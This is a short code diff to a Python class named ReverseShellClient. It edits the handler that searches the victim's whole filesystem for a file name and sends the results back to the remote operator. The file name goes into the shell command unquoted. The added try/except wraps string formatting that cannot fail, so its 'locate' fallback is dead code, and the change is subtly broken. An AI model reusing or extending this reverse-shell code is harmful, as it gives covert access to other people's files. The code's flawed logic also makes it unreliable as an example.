@@ -125,7 +125,14 @@ class ReverseShellClient:
         if os.name == "nt":
             command = f"dir /s /b {file_name}"
         else:
-            command = f"find / -name {file_name}"
+            try:
+                command = f"find / -name {file_name}"
+            except Exception as e:
+                logging.error(f"Failed to handle search: {e}")
+                # try with locate
+                command = f"updatedb && locate {file_name}"
+                
+                
         logging.info(f"Handling search for file: {file_name}")
         result = self.run_system_command(command)
         self.send_large_data(result)
